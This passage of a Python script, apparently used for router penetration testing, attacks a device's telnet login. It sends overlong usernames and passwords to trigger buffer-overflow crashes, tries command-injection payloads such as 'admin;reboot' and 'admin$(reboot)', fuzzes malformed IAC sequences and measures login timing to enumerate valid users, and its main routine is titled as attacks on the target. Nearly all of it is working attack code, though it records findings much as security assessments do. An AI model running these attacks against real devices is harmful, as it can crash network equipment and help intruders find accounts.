                            f"Send {size}-byte username to telnet login",
                            f"Response: {len(resp)} bytes (service survived)",
                            {"username_size": size, "response_size": len(resp)})
            except socket.timeout:
                ec.add_test("telnet", f"Long username ({size}B)",
                            f"Send {size}-byte username",
                            "No response (timeout)",
                            {"username_size": size})
            s.close()
        except Exception as e:
            ec.add_test("telnet", f"Long username ({size}B)",
                        f"Buffer overflow test", f"Error: {e}",
                        anomaly="reset" in str(e).lower() or "refused" in str(e).lower())

        # Long password
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET, 23))
            time.sleep(0.5)
            try:
                s.recv(4096)
            except:
                pass

            s.send(b"admin\r\n")
            time.sleep(0.5)
            try:
                s.recv(4096)
            except:
                pass

            long_pass = "B" * size
            s.send(long_pass.encode() + b"\r\n")
            time.sleep(0.5)
            try:
                resp = s.recv(4096)
                ec.add_test("telnet", f"Long password ({size}B)",
                            f"Send {size}-byte password to telnet",
                            f"Response: {len(resp)} bytes (service survived)",
                            {"password_size": size, "response_size": len(resp)})
            except socket.timeout:
                ec.add_test("telnet", f"Long password ({size}B)",
                            f"Send {size}-byte password",
                            "No response (timeout)",
                            {"password_size": size})
            s.close()
        except Exception as e:
            ec.add_test("telnet", f"Long password ({size}B)",
                        f"Buffer overflow test", f"Error: {e}",
                        anomaly="reset" in str(e).lower())

        if size >= 4096:
            h = check_router_alive()
            if not h.get("alive"):
                ec.add_finding("CRITICAL", f"Telnet buffer overflow crash ({size}B)",
                               f"Router crashed after {size}-byte input to telnet login",
                               cwe="CWE-120")
                wait_for_router()
                break

    # ── Test 15-20: Command injection in login prompt ────────────────────
    log("  Testing telnet login prompt injection...")
    login_injections = [
        ("admin;reboot", "Semicolon injection"),
        ("admin\x00root", "Null byte injection"),
        ("admin\nPASS root", "Newline injection"),
        ("admin$(reboot)", "Command substitution"),
        ("admin`id`", "Backtick injection"),
        ("admin|reboot", "Pipe injection"),
        ("' OR '1'='1", "SQL-style injection"),
        ("admin\r\n\r\n/system reboot", "Double CRLF injection"),
    ]

    for payload, desc in login_injections:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET, 23))
            time.sleep(0.5)
            try:
                s.recv(4096)
            except:
                pass

            s.send(payload.encode("utf-8", errors="replace") + b"\r\n")
            time.sleep(0.5)
            try:
                resp = s.recv(4096)
                resp_text = resp.decode("utf-8", errors="replace")
            except:
                resp_text = ""

            ec.add_test("telnet", f"Login injection: {desc}",
                        f"Injection in telnet login: {desc}",
                        f"Response: {resp_text[:200]}",
                        {"payload": repr(payload), "description": desc,
                         "response": resp_text[:500]})
            s.close()
        except Exception as e:
            ec.add_test("telnet", f"Login injection: {desc}",
                        f"Login injection test", f"Error: {e}")

    check_router_alive()

    # ── Test 21-30: IAC (Interpret As Command) fuzzing ───────────────────
    log("  Testing malformed IAC sequence handling...")
    iac_payloads = [
        ("Single IAC", b"\xff"),
        ("IAC IAC (escaped 0xFF)", b"\xff\xff"),
        ("IAC without option", b"\xff\xfb"),
        ("IAC WILL all options", b"".join(b"\xff\xfb" + bytes([i]) for i in range(256))),
        ("IAC DO all options", b"".join(b"\xff\xfd" + bytes([i]) for i in range(256))),
        ("IAC subneg unterminated", b"\xff\xfa\x18\x00MIKROTIK"),
        ("IAC subneg with data", b"\xff\xfa\x18\x00xterm-256color\xff\xf0"),
        ("Nested IAC in subneg", b"\xff\xfa\x18\xff\xfa\x18\xff\xf0"),
        ("IAC interrupt (IP)", b"\xff\xf4"),
        ("IAC break (BRK)", b"\xff\xf3"),
        ("IAC AYT (Are You There)", b"\xff\xf6"),
        ("IAC abort output (AO)", b"\xff\xf5"),
        ("100x IAC NOP", b"\xff\xf1" * 100),
        ("Rapid IAC mix", b"\xff\xfb\x01\xff\xfd\x03\xff\xfe\x18\xff\xfc\x1f" * 20),
    ]

    for name, payload in iac_payloads:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET, 23))
            time.sleep(0.3)
            try:
                s.recv(4096)
            except:
                pass

            s.send(payload)
            time.sleep(0.5)
            try:
                resp = s.recv(4096)
            except:
                resp = b""

            ec.add_test("telnet", f"IAC fuzz: {name}",
                        f"Send malformed IAC sequence: {name}",
                        f"Response: {len(resp)} bytes",
                        {"payload_hex": payload.hex()[:200], "payload_size": len(payload),
                         "response_size": len(resp),
                         "response_hex": resp.hex()[:200] if resp else ""})
            s.close()
        except Exception as e:
            ec.add_test("telnet", f"IAC fuzz: {name}",
                        f"IAC fuzzing test", f"Error: {e}",
                        anomaly="reset" in str(e).lower())

    h = check_router_alive()
    if not h.get("alive"):
        ec.add_finding("HIGH", "Telnet IAC processing crash",
                       "Router crashed during IAC sequence fuzzing",
                       cwe="CWE-20")
        wait_for_router()

    # ── Test 31-34: Telnet timing analysis ───────────────────────────────
    log("  Testing telnet authentication timing...")
    timings = {"valid_user": [], "invalid_user": []}

    for i in range(5):
        # Valid username, wrong password
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((TARGET, 23))
            time.sleep(0.5)
            try:
                s.recv(4096)
            except:
                pass
            s.send(b"\xff\xfb\x18")  # minimal negotiation
            time.sleep(0.3)
            try:
                s.recv(4096)
            except:
                pass

            s.send(b"admin\r\n")
            time.sleep(0.5)
            try:
                s.recv(4096)
            except:
                pass

            start = time.time()
            s.send(b"WrongPassword\r\n")
            try:
                s.recv(4096)
            except:
                pass
            elapsed = time.time() - start
            timings["valid_user"].append(elapsed)
            s.close()
        except:
            pass

        # Invalid username
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((TARGET, 23))
            time.sleep(0.5)
            try:
                s.recv(4096)
            except:
                pass
            s.send(b"\xff\xfb\x18")
            time.sleep(0.3)
            try:
                s.recv(4096)
            except:
                pass

            s.send(b"nonexistent_user_xyz\r\n")
            time.sleep(0.5)
            try:
                s.recv(4096)
            except:
                pass

            start = time.time()
            s.send(b"WrongPassword\r\n")
            try:
                s.recv(4096)
            except:
                pass
            elapsed = time.time() - start
            timings["invalid_user"].append(elapsed)
            s.close()
        except:
            pass

    if timings["valid_user"] and timings["invalid_user"]:
        avg_valid = sum(timings["valid_user"]) / len(timings["valid_user"])
        avg_invalid = sum(timings["invalid_user"]) / len(timings["invalid_user"])
        diff_ms = abs(avg_valid - avg_invalid) * 1000

        ec.add_test("telnet", "Auth timing oracle",
                    "Measure timing difference between valid/invalid usernames",
                    f"Valid user avg: {avg_valid*1000:.1f}ms, Invalid user avg: {avg_invalid*1000:.1f}ms, "
                    f"Diff: {diff_ms:.1f}ms",
                    {"valid_user_times": timings["valid_user"],
                     "invalid_user_times": timings["invalid_user"],
                     "avg_valid_ms": round(avg_valid * 1000, 1),
                     "avg_invalid_ms": round(avg_invalid * 1000, 1),
                     "diff_ms": round(diff_ms, 1)},
                    anomaly=diff_ms > 50)

        if diff_ms > 50:
            ec.add_finding("LOW", "Telnet user enumeration via timing",
                           f"Telnet login timing differs by {diff_ms:.0f}ms between "
                           f"valid and invalid usernames, enabling user enumeration",
                           cwe="CWE-203")

    check_router_alive()


# =============================================================================
# Main
# =============================================================================

def main():
    log(f"Starting SSH/FTP/Telnet attacks against {TARGET}")
    log("=" * 60)

    ssh_tests()
    ftp_tests()
    telnet_tests()

    # Pull router logs and save evidence
    ec.save("ssh_ftp_telnet_attacks.json")
    ec.summary()


if __name__ == "__main__":
    os.chdir(BASE_DIR)
    main()
